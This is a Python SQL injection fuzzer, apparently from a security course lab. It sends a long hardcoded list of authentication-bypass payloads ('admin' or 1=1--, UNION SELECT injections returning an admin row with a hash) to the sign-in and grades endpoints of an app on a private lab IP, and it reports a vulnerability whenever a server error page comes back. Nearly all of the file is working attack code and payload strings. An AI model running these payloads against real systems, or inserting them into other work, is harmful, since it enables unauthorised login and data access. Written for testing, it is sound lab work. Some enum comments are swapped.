#!/usr/bin/env python3
import requests  # for sending/receiving web requests
import sys  # various system routines (exit, access to stdin, stderr, etc.)
import itertools  # simple tools for computing, e.g., the cross-product of lists
from enum import Enum  # for defining enumerations


class PayloadType(Enum):
    SQL_STATIC = 1  # fuzz with a pre-configured list of SQL payloads
    XSS_STATIC = 2  # fuzz with a pre-configured list of XSS payloads
    XSS = 3  # fuzz with dynamically generated SQL payloads (mutations)
    SQL = 4  # fuzz with dynamically generated XSS payloads (mutations)


class SQLFuzzConfig:
    def __init__(self):
        self.app_root_url = "http://192.168.231.128:3000/"
        self.login_endpoint = {
            "url": "/sign_in",
            "param_data": {
                "login": "peter",
                "password": "football"
            }
        }
        self.endpoints = [
            {
                "url": "/grades",
                "method": "GET",
                "require_login": False,
                "param_data": {},
                "cookie_data": {
                    "session": [PayloadType.SQL],
                },
            },
            {
                "url": "/grades",
                "method": "GET",
                "require_login": True,
                "param_data": {
                    "lecturer": [PayloadType.SQL]
                },
                "cookie_data": {},
            },
            {
                "url": "/sign_in",
                "method": "POST",
                "require_login": False,
                "param_data": {
                    "login": [PayloadType.SQL],
                    "password": [PayloadType.SQL_STATIC]
                },
                "cookie_data": {},
            },
        ]


def main():
    objective = SQLFuzzConfig()
    print(objective.login_endpoint)
    print(objective.login_endpoint['url'])
    data = objective.login_endpoint
    param_data = data['param_data']
    print(param_data)
    payload = ["root' --", "root' #", "root'/*", "root' or '1'='1", "root' or '1'='1'--", "root' or '1'='1'#",
               "root' or '1'='1'/*", "root'or 1=1 or ''='", "root' or 1=1", "root' or 1=1--", "root' or 1=1#",
               "root' or 1=1/*", "root') or ('1'='1", "root') or ('1'='1'--", "root') or ('1'='1'#",
               "root') or ('1'='1'/*", "root') or '1'='1", "root') or '1'='1'--", "root') or '1'='1'#",
               "root') or '1'='1'/*", "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*", "' or 1=1", "' or 1=1--",
               "' or 1=1#", "' or 1=1/*", "\" or 1=1", "\" or 1=1--", "\" or 1=1#", "\" or 1=1/*",
               "1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055", "root\" --", "root\" #",
               "root\"/*", "root\" or \"1\"=\"1", "root\" or \"1\"=\"1\"--", "root\" or \"1\"=\"1\"#",
               "root\" or \"1\"=\"1\"/*", "root\" or 1=1 or \"\"=\"", "root\" or 1=1", "root\" or 1=1--",
               "root\" or 1=1#", "root\" or 1=1/*", "root\") or (\"1\"=\"1", "root\") or (\"1\"=\"1\"--",
               "root\") or (\"1\"=\"1\"#", "root\") or (\"1\"=\"1\"/*", "root\") or \"1\"=\"1",
               "root\") or \"1\"=\"1\"--", "root\") or \"1\"=\"1\"#", "root\") or \"1\"=\"1\"/*",
               "1234 \" AND 1=0 UNION ALL SELECT \"root\", \"81dc9bdb52d04dc20036dbd8313ed055", "admin' --", "admin' #",
               "admin'/*", "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*",
               "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*",
               "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*",
               "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#", "admin') or '1'='1'/*",
               "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", "admin\" --", "admin\" #",
               "admin\"/*", "admin\" or \"1\"=\"1", "admin\" or \"1\"=\"1\"--", "admin\" or \"1\"=\"1\"#",
               "admin\" or \"1\"=\"1\"/*", "admin\"or 1=1 or \"\"=\"", "admin\" or 1=1", "admin\" or 1=1--",
               "admin\" or 1=1#", "admin\" or 1=1/*", "admin\") or (\"1\"=\"1", "admin\") or (\"1\"=\"1\"--",
               "admin\") or (\"1\"=\"1\"#", "admin\") or (\"1\"=\"1\"/*", "admin\") or \"1\"=\"1",
               "admin\") or \"1\"=\"1\"--", "admin\") or \"1\"=\"1\"#"]
    with requests.Session() as s:
        for p in payload:
            param_data['login'] = p
            r = s.post('http://192.168.231.128:3000/sign_in', params=param_data)

            if 'We\'re sorry, but something went wrong' in r.text:
                print('A vulnerability has been found in Login Page', p)

        for p in payload:
            param_data['lecturer'] = p
            r = s.get('http://192.168.231.128:3000/grades', data=param_data)

            if 'We\'re sorry, but something went wrong' in r.text:
                print('A vulnerability has been found in Grades Page ', p)



if __name__ == '__main__':
    main()